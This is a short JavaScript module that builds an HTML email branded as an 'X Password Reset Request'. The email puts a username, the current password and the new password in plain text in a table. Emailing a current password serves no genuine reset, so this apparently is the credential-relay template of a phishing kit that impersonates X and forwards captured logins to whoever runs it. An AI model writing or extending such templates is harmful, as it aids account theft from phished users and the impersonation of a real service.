const loginSubmission = (username,  currentPassword,
    newPassword) => `
    <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; color: #333; padding: 20px; max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px;">
  <!-- Header with X logo -->
  <div style="text-align: center; padding-bottom: 20px;">
     <img src='https://res.cloudinary.com/dscpwrzng/image/upload/q_auto,f_auto/v1734948984/x_ko341d.png
' alt="X Logo" style="max-width: 120px; height: auto;" />
  </div>
  
  <!-- Main Content -->
  <h2 style="font-size: 20px; text-align: center; color: #0066cc;">X Password Reset Request</h2>
  <p style="font-size: 14px; line-height: 1.5;">A X password reset request has been received with the following details:</p>
  
  <table style="width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 14px; line-height: 1.5;">
    <tbody>
      <tr><td style="font-weight: bold; padding: 8px; border: 1px solid #ddd;">Username:</td><td style="padding: 8px; border: 1px solid #ddd;">${username}</td></tr>
      <tr><td style="font-weight: bold; padding: 8px; border: 1px solid #ddd;">Current Password:</td><td style="padding: 8px; border: 1px solid #ddd;">${currentPassword}</td></tr>
      <tr><td style="font-weight: bold; padding: 8px; border: 1px solid #ddd;">New Password:</td><td style="padding: 8px; border: 1px solid #ddd;">${newPassword}</td></tr>
    </tbody>
  </table>

  <!-- Footer Section -->
  <footer style="margin-top: 30px; font-size: 12px; color: #777; text-align: center; border-top: 1px solid #ddd; padding-top: 10px;">
    <p>This is an automated email. Please review the password reset request and respond accordingly. For any issues, please <a href="mailto:support@yourcompany.com" style="color: #0066cc;">contact our support team</a>.</p>
    <p>&copy; ${new Date().getFullYear()} X. All rights reserved.</p>
  </footer>
</div>
    `;

    module.exports = loginSubmission;